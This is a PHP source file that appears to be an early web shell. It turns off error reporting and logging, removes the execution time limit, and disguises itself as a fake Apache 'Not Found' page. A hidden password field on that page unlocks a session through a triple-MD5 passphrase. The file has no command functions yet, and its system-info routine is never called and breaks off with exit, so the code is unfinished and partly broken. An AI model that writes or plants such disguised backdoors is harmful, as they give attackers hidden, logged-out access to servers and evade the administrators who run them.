<?php

/* ----------------- */
/* -   Variables   - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    @define('VERSION', '1.0');
    @define('AUTHOR', 'CosasDePuma');

    $passphrase = "136c757bdd877848762c248e58252935"; //md5 x3 (cosasdepuma)

/* ----------------- */
/* - Configuration - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    @set_time_limit(0); // Unlimited execution time
    @error_reporting(0); // Disable errors and warnings
    @session_start(); // Create or resume the current session

    // Rewrite php.ini file
    @ini_set('error_log',NULL); // No error log file
    @ini_set('log_errors',0); // Don't write errors in log
    @ini_set('max_execution_time',0); // Unlimited execution time

    // Magic Quotes!
    if (version_compare(PHP_VERSION, '5.3.0', '<')) {
        @set_magic_quotes_runtime(0);
        // Check Magic Quotes (It's important...)
        if(get_magic_quotes_gpc()) {
            function stripslashes_array($array) { 
                return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); 
            }
            $_POST = stripslashes_array($_POST);
        }
    }

/* ----------------- */
/* -   Functions   - */
/* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    function ApacheNotFound() {
        // Close PHP and start HTML
        ?>

        <h1>Not Found</h1> 
        <p>The requested URL <?=dirname(($_SERVER['REQUEST_URI']))?> was not found on this server.</p>
        <hr>
        <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
        </body>

        <center>
        <form method="post"> 
        <input style="margin:0; background-color: #fff; border: 0px" type="password" name="passwd"> 
        </form></center> 

        <?php
        // Close HTML and start PHP
        exit;
    }

    function GetSysInfo() {
        //Check OS Enviroment
        if(strtolower(substr(PHP_OS,0,3)) == "win") $info['os'] = 'win';
        else $info['os'] = 'nix';
        exit;
    }

    /* ----------------- */
    /* -    Threads    - */
    /* ----------------- */

/* >>>>>>>>>>>>>>>>> */
    // Check if we are not logging
    if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
        // Check if:
        // - Login is necessary
        // - Password equals Passphrase
        if(empty($passphrase) || (isset($_POST['passwd']) && (md5(md5(md5($_POST['passwd']))) == $passphrase))) {
            // Login and active the session
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        } else {
            /// Display NotFound page
            ApacheNotFound();
        }
    }


    //Display information
    echo $info['os'] ;
    
    // Log out
    if(isset($_GET['out'])) {
        unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    }

?>